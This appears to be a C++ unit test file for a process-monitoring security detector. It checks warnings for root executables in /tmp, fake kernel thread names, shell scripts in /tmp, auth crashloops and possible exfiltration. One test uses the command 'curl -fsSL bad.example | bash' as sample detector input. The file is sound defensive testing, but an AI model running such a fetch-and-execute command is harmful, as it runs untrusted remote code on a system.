#include "minitest.hpp"
#include "app/Security.hpp"
#include "model/Snapshot.hpp"
#include <string>
#include <vector>

using montauk::app::SecurityFinding;
using montauk::app::collect_security_findings;
using montauk::app::format_security_line_default;
using montauk::app::format_security_line_system;

static montauk::model::ProcSample make_proc(int pid,
                                            const std::string& user,
                                            const std::string& cmd,
                                            const std::string& exe,
                                            double cpu,
                                            montauk::model::ChurnReason churn_reason = montauk::model::ChurnReason::None) {
  montauk::model::ProcSample p;
  p.pid = pid;
  p.user_name = user;
  p.cmd = cmd;
  p.exe_path = exe;
  p.cpu_pct = cpu;
  p.churn_reason = churn_reason;
  return p;
}

TEST(security_root_tmp_warning) {
  montauk::model::Snapshot snap;
  snap.procs.processes.push_back(make_proc(1324, "root", "/tmp/.kworkerd", "/tmp/.kworkerd", 0.5));
  auto findings = collect_security_findings(snap);
  ASSERT_EQ(1u, findings.size());
  ASSERT_EQ(2, findings[0].severity);
  ASSERT_TRUE(format_security_line_default(findings[0]).find("root exec") != std::string::npos);
}

TEST(security_fake_kernel_thread) {
  montauk::model::Snapshot snap;
  snap.procs.processes.push_back(make_proc(4269, "root", "[kthreadd]", "/usr/local/bin/fake", 0.0));
  auto findings = collect_security_findings(snap);
  ASSERT_EQ(1u, findings.size());
  ASSERT_EQ(2, findings[0].severity);
  auto line = format_security_line_system(findings[0]);
  ASSERT_TRUE(line.find("FAKE KERNEL THREAD") != std::string::npos);
}

TEST(security_curl_bash_caution) {
  montauk::model::Snapshot snap;
  snap.procs.processes.push_back(make_proc(2981, "mod",
                                           "curl -fsSL bad.example | bash",
                                           "/usr/bin/curl", 0.1));
  auto findings = collect_security_findings(snap);
  ASSERT_EQ(1u, findings.size());
  ASSERT_EQ(1, findings[0].severity);
  auto line = format_security_line_default(findings[0]);
  ASSERT_TRUE(line.find("script download") != std::string::npos);
}

TEST(security_python_home_caution) {
  montauk::model::Snapshot snap;
  snap.procs.processes.push_back(make_proc(6872, "mod",
                                           "python /home/mod/scripts/watch.py",
                                           "/usr/bin/python", 0.1));
  auto findings = collect_security_findings(snap);
  ASSERT_EQ(1u, findings.size());
  ASSERT_EQ(1, findings[0].severity);
  ASSERT_TRUE(format_security_line_system(findings[0]).find("HOME SCRIPT") != std::string::npos);
}

TEST(security_tmp_shell_warning) {
  montauk::model::Snapshot snap;
  snap.procs.processes.push_back(make_proc(903350, "mod",
                                           "bash /tmp/proc_churn.sh 8 1000 0",
                                           "/usr/bin/bash", 0.5));
  auto findings = collect_security_findings(snap);
  ASSERT_EQ(1u, findings.size());
  ASSERT_EQ(2, findings[0].severity);
  auto line = format_security_line_default(findings[0]);
  ASSERT_TRUE(line.find("TMP SHELL SCRIPT") != std::string::npos);
}

TEST(security_auth_churn_warning) {
  // Auth crashloop requires BOTH: high global churn (3+ events/2s) AND auth process with read failure
  montauk::model::Snapshot snap;
  snap.churn.recent_2s_events = 5;  // Sustained churn activity
  snap.churn.recent_2s_proc = 5;
  auto p = make_proc(5210, "root", "sshd", "/usr/sbin/sshd", 0.0, montauk::model::ChurnReason::ReadFailed);
  snap.procs.processes.push_back(p);
  auto findings = collect_security_findings(snap);
  ASSERT_EQ(1u, findings.size());
  ASSERT_EQ(2, findings[0].severity);
  ASSERT_TRUE(format_security_line_default(findings[0]).find("auth crashloop") != std::string::npos);
}

TEST(security_read_failed_no_false_positive) {
  // Single ReadFailed with LOW global churn should NOT trigger auth crashloop warning.
  // This was the original bug: single /proc read failures were misinterpreted as crashloops.
  montauk::model::Snapshot snap;
  snap.churn.recent_2s_events = 1;  // Below threshold (< 3)
  auto p = make_proc(5210, "root", "sshd", "/usr/sbin/sshd", 0.0, montauk::model::ChurnReason::ReadFailed);
  snap.procs.processes.push_back(p);
  auto findings = collect_security_findings(snap);
  // Should have no findings - not enough sustained churn to indicate crashloop
  ASSERT_EQ(0u, findings.size());
}

TEST(security_high_churn_non_auth_no_warning) {
  // High global churn but NO auth processes affected = no warning
  montauk::model::Snapshot snap;
  snap.churn.recent_2s_events = 10;  // High churn
  snap.churn.recent_2s_proc = 10;
  // Non-auth process with read failure
  auto p = make_proc(1234, "mod", "myapp", "/usr/bin/myapp", 0.0, montauk::model::ChurnReason::ReadFailed);
  snap.procs.processes.push_back(p);
  auto findings = collect_security_findings(snap);
  // No auth crashloop warning - the churning process isn't auth-related
  ASSERT_EQ(0u, findings.size());
}

TEST(security_net_exfil_caution) {
  montauk::model::Snapshot snap;
  montauk::model::NetIf iface;
  iface.name = "wlan0";
  iface.rx_bps = 1.2 * 1024 * 1024;
  snap.net.interfaces.push_back(iface);
  auto findings = collect_security_findings(snap);
  ASSERT_EQ(1u, findings.size());
  ASSERT_EQ(1, findings[0].severity);
  ASSERT_TRUE(format_security_line_system(findings[0]).find("POSSIBLE EXFIL") != std::string::npos);
}
